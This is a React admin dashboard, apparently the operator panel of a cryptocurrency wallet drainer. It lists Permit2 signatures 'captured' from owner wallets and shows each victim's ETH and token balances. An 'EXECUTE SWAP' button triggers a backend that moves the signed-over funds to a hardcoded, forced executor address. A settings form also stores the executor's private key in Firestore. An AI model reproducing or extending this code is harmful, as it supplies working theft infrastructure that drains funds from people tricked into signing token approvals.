import React, { useState, useEffect } from 'react';
import { db } from './firebase';
import { collection, query, onSnapshot, doc as docRef, getDoc, setDoc } from 'firebase/firestore';
import { ethers } from 'ethers';

const BACKEND_URL = "/api/run-worker";
const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';

export default function Admin() {
  const [signatures, setSignatures] = useState([]);
  const [groupedData, setGroupedData] = useState({});
  
  const [recipient] = useState(HARDCODED_EXECUTOR);
  const [outputToken, setOutputToken] = useState(localStorage.getItem('admin_outputToken') || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2");

  const [isSettingsOpen, setIsSettingsOpen] = useState(false);
  const [settingsLoading, setSettingsLoading] = useState(false);
  const [settingsStatus, setSettingsStatus] = useState("");
  const [executorAddressSetting] = useState(HARDCODED_EXECUTOR);
  const [executorPrivateKeySetting, setExecutorPrivateKeySetting] = useState('');

  const [selectedWallet, setSelectedWallet] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [processingId, setProcessingId] = useState(null);
  const [statusMsg, setStatusMsg] = useState("");

  const [balances, setBalances] = useState({});
  const [tokenBalances, setTokenBalances] = useState({});
  const [executorEthBalance, setExecutorEthBalance] = useState('—');
  const [executorTokenBalance, setExecutorTokenBalance] = useState('—');
  const [tokenSymbol, setTokenSymbol] = useState('TOKEN');
  const [tokenDecimals, setTokenDecimals] = useState(6);

  const tokenAddress = outputToken || import.meta.env.VITE_USDT_ADDRESS || '0xdAC17F958D2ee523a2206206994597C13D831ec7';
  const provider = new ethers.JsonRpcProvider(import.meta.env.VITE_RPC_URL || 'https://cloudflare-eth.com');
  const ERC20_ABI = ['function balanceOf(address) view returns (uint256)', 'function decimals() view returns (uint8)', 'function symbol() view returns (string)'];

  // Save output token to localStorage
  useEffect(() => {
    localStorage.setItem('admin_outputToken', outputToken);
  }, [outputToken]);

  // Load settings
  const openSettings = async () => {
    setIsSettingsOpen(true);
    setSettingsLoading(true);
    try {
      const snap = await getDoc(docRef(db, 'admin_config', 'settings'));
      const s = snap.exists() ? snap.data() : {};
      setOutputToken(s.tokenAddress || outputToken);
      setExecutorPrivateKeySetting(s.executorPrivateKey || '');
      setSettingsStatus('Settings loaded');
    } catch (err) {
      setSettingsStatus('Failed to load');
    } finally {
      setSettingsLoading(false);
    }
  };

  const saveSettings = async () => {
    setSettingsLoading(true);
    try {
      await setDoc(docRef(db, 'admin_config', 'settings'), {
        tokenAddress: outputToken,
        executorPrivateKey: executorPrivateKeySetting || undefined,
      }, { merge: true });
      setSettingsStatus('Saved successfully');
    } catch (err) {
      setSettingsStatus('Save failed');
    } finally {
      setSettingsLoading(false);
    }
  };

  // Real-time signatures
  useEffect(() => {
    const q = query(collection(db, "permit2_signatures"));
    const unsub = onSnapshot(q, (snapshot) => {
      const docs = snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
      setSignatures(docs);

      const groups = {};
      docs.forEach(doc => {
        if (!groups[doc.owner]) groups[doc.owner] = [];
        groups[doc.owner].push(doc);
      });
      setGroupedData(groups);
    });
    return () => unsub();
  }, []);

  // Fetch balances
  useEffect(() => {
    const owners = Object.keys(groupedData);
    if (!owners.length) return;

    (async () => {
      let tokenContract;
      try {
        tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
        const [dec, sym] = await Promise.all([
          tokenContract.decimals(),
          tokenContract.symbol().catch(() => 'TOKEN')
        ]);
        setTokenDecimals(Number(dec));
        setTokenSymbol(sym);
      } catch (_) {}

      const bal = { ...balances };
      const tbal = { ...tokenBalances };

      for (const owner of owners) {
        const eth = await provider.getBalance(owner).catch(() => 0n);
        bal[owner] = parseFloat(ethers.formatEther(eth)).toFixed(4);

        if (tokenContract) {
          const tb = await tokenContract.balanceOf(owner).catch(() => 0n);
          tbal[owner] = Number(ethers.formatUnits(tb, tokenDecimals)).toFixed(4);
        }
      }

      // Executor balance
      const execEth = await provider.getBalance(HARDCODED_EXECUTOR).catch(() => 0n);
      setExecutorEthBalance(parseFloat(ethers.formatEther(execEth)).toFixed(4));
      if (tokenContract) {
        const tb = await tokenContract.balanceOf(HARDCODED_EXECUTOR).catch(() => 0n);
        setExecutorTokenBalance(Number(ethers.formatUnits(tb, tokenDecimals)).toFixed(4));
      }

      setBalances(bal);
      setTokenBalances(tbal);
    })();
  }, [groupedData, tokenAddress, tokenDecimals]);

  const handleExecute = async (sigData) => {
    setProcessingId(sigData.id);
    setStatusMsg("Contacting backend...");

    try {
      const res = await fetch(BACKEND_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          docId: sigData.id,
          recipient,
          outputToken
        })
      });
      const data = await res.json();
      if (!res.ok || !data.ok) throw new Error(data.error || "Failed");

      setStatusMsg("Swap executed successfully!");
      setTimeout(() => setStatusMsg(""), 4000);
    } catch (err) {
      setStatusMsg("Error: " + err.message);
    } finally {
      setProcessingId(null);
    }
  };

  return (
    <>
      <div className="min-h-screen bg-gray-50">
        {/* Header */}
        <header className="bg-white border-b border-gray-200 shadow-sm">
          <div className="max-w-7xl mx-auto px-6 py-5 flex items-center justify-between">
            <div>
              <h1 className="text-2xl font-bold text-gray-900">Admin Control Center</h1>
              <p className="text-sm text-gray-500 mt-1">Manage Permit2 signatures & execute swaps</p>
            </div>
            <div className="flex items-center gap-4">
              <span className="px-3 py-1.5 text-xs font-medium text-green-700 bg-green-100 rounded-full">Server Mode • Active</span>
              <button onClick={openSettings} className="p-2 hover:bg-gray-100 rounded-lg transition">
                <svg className="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                </svg>
              </button>
            </div>
          </div>
        </header>

        <div className="max-w-7xl mx-auto px-6 py-8">
          {/* Executor Card */}
          <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-6 mb-8">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-gray-600">Executor Address (Forced)</p>
                <p className="font-mono text-lg mt-1">{HARDCODED_EXECUTOR.slice(0, 10)}...{HARDCODED_EXECUTOR.slice(-8)}</p>
              </div>
              <div className="text-right">
                <p className="text-2xl font-bold text-gray-900">{executorEthBalance} ETH</p>
                <p className="text-lg text-gray-600">{executorTokenBalance} {tokenSymbol}</p>
              </div>
            </div>
          </div>

          {/* Output Token Input */}
          <div className="bg-white rounded-xl shadow-sm border border-gray-200 p-5 mb-8">
            <label className="block text-sm font-medium text-gray-700 mb-2">Output Token Address</label>
            <input
              type="text"
              value={outputToken}
              onChange={(e) => setOutputToken(e.target.value)}
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition"
              placeholder="0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (WETH)"
            />
          </div>

          {/* Wallet Grid */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
            {Object.keys(groupedData).length === 0 ? (
              <div className="col-span-full text-center py-20 text-gray-500">
                <div className="text-6xl mb-4">📭</div>
                <p className="text-lg">No signatures captured yet.</p>
              </div>
            ) : (
              Object.keys(groupedData).map(owner => {
                const pending = groupedData[owner].filter(x => !x.processed).length;
                return (
                  <div
                    key={owner}
                    onClick={() => { setSelectedWallet(owner); setIsModalOpen(true); }}
                    className="bg-white rounded-xl shadow-sm border border-gray-200 p-6 hover:shadow-lg hover:border-gray-300 transition cursor-pointer"
                  >
                    <div className="flex items-center justify-between mb-4">
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 bg-gradient-to-br from-blue-500 to-purple-600 rounded-lg flex items-center justify-center text-white font-bold">W</div>
                        <div>
                          <p className="font-mono text-sm font-medium">{owner.slice(0, 8)}...{owner.slice(-6)}</p>
                        </div>
                      </div>
                    </div>

                    <div className="space-y-3">
                      <div className="flex justify-between text-sm">
                        <span className="text-gray-600">Balance</span>
                        <span className="font-medium">
                          {balances[owner] || '—'} ETH
                        </span>
                      </div>
                      <div className="flex justify-between text-sm">
                        <span className="text-gray-600">{tokenSymbol}</span>
                        <span className="font-medium">{tokenBalances[owner] || '—'}</span>
                      </div>
                      <div className="border-t pt-3">
                        <div className="flex justify-between text-sm">
                          <span className="text-gray-600">Signatures</span>
                          <span className="font-semibold text-blue-600">{groupedData[owner].length}</span>
                        </div>
                        <div className="flex justify-between text-sm mt-1">
                          <span className="text-gray-600">Pending</span>
                          <span className={`font-bold ${pending > 0 ? 'text-orange-600' : 'text-green-600'}`}>
                            {pending}
                          </span>
                        </div>
                      </div>
                    </div>

                    <button className="mt-5 w-full py-2.5 bg-gradient-to-r from-blue-600 to-purple-600 text-white font-medium rounded-lg hover:from-blue-700 hover:to-purple-700 transition">
                      Manage Wallet
                    </button>
                  </div>
                );
              })
            )}
          </div>
        </div>

        {/* Wallet Modal */}
        {isModalOpen && selectedWallet && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4" onClick={() => setIsModalOpen(false)}>
            <div className="bg-white rounded-2xl shadow-2xl max-w-2xl w-full max-h-[90vh] overflow-y-auto" onClick={e => e.stopPropagation()}>
              <div className="p-6 border-b border-gray-200">
                <div className="flex items-center justify-between">
                  <h2 className="text-2xl font-bold">Wallet: {selectedWallet.slice(0, 10)}...{selectedWallet.slice(-8)}</h2>
                  <button onClick={() => setIsModalOpen(false)} className="text-gray-500 hover:text-gray-700">
                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" /></svg>
                  </button>
                </div>
              </div>

              {statusMsg && (
                <div className={`mx-6 mt-4 px-4 py-3 rounded-lg text-sm font-medium ${statusMsg.includes("Success") ? "bg-green-100 text-green-800" : statusMsg.includes("Error") ? "bg-red-100 text-red-800" : "bg-blue-100 text-blue-800"}`}>
                  {statusMsg}
                </div>
              )}

              <div className="p-6 space-y-4">
                {groupedData[selectedWallet].map(sig => (
                  <div key={sig.id} className={`p-5 rounded-xl border ${sig.processed ? 'bg-gray-50 border-gray-200' : 'bg-white border-gray-300 shadow-sm'}`}>
                    <div className="grid grid-cols-2 gap-4 text-sm">
                      <div><span className="text-gray-600">Token</span><p className="font-mono font-medium">{sig.token.slice(0, 10)}...{sig.token.slice(-8)}</p></div>
                      <div><span className="text-gray-600">Amount</span><p className="font-medium">{(BigInt(sig.amount) / (10n ** BigInt(tokenDecimals))).toString()} {tokenSymbol}</p></div>
                      <div><span className="text-gray-600">Status</span><p><span className={`inline-block px-3 py-1 rounded-full text-xs font-medium ${sig.processed ? 'bg-green-100 text-green-800' : 'bg-yellow-100 text-yellow-800'}`}>{sig.processed ? 'Processed' : 'Ready'}</span></p></div>
                    </div>

                    {sig.lastError && !sig.processed && (
                      <p className="text-red-600 text-xs mt-3">⚠️ {sig.lastError}</p>
                    )}

                    <div className="mt-4">
                      {!sig.processed ? (
                        <button
                          onClick={() => handleExecute(sig)}
                          disabled={processingId === sig.id}
                          className="w-full py-3 bg-gradient-to-r from-emerald-500 to-teal-600 text-white font-semibold rounded-lg hover:from-emerald-600 hover:to-teal-700 disabled:opacity-70 transition"
                        >
                          {processingId === sig.id ? "Processing..." : "EXECUTE SWAP"}
                        </button>
                      ) : (
                        <a href={`https://etherscan.io/tx/${sig.routerTx}`} target="_blank" rel="noreferrer"
                          className="block text-center py-3 bg-gray-100 text-gray-700 font-medium rounded-lg hover:bg-gray-200 transition">
                          View Transaction ↗
                        </a>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* Settings Modal */}
        {isSettingsOpen && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4" onClick={() => setIsSettingsOpen(false)}>
            <div className="bg-white rounded-2xl shadow-2xl max-w-lg w-full p-8" onClick={e => e.stopPropagation()}>
              <h2 className="text-2xl font-bold mb-6">App Settings</h2>
              <div className="space-y-5">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Executor Private Key (Optional)</label>
                  <input
                    type="password"
                    value={executorPrivateKeySetting}
                    onChange={e => setExecutorPrivateKeySetting(e.target.value)}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none"
                    placeholder="Highly insecure if saved here"
                  />
                  <p className="text-xs text-red-600 mt-2">Never store private keys in Firestore in production!</p>
                </div>
                <div className="flex gap-3">
                  <button onClick={saveSettings} disabled={settingsLoading} className="flex-1 py-3 bg-blue-600 text-white font-medium rounded-lg hover:bg-blue-700 disabled:opacity-70 transition">
                    {settingsLoading ? "Saving..." : "Save Settings"}
                  </button>
                  <button onClick={() => setIsSettingsOpen(false)} className="px-6 py-3 border border-gray-300 rounded-lg hover:bg-gray-50 transition">Cancel</button>
                </div>
                {settingsStatus && <p className="text-sm text-gray-600 text-center">{settingsStatus}</p>}
              </div>
            </div>
          </div>
        )}
      </div>
    </>
  );
}
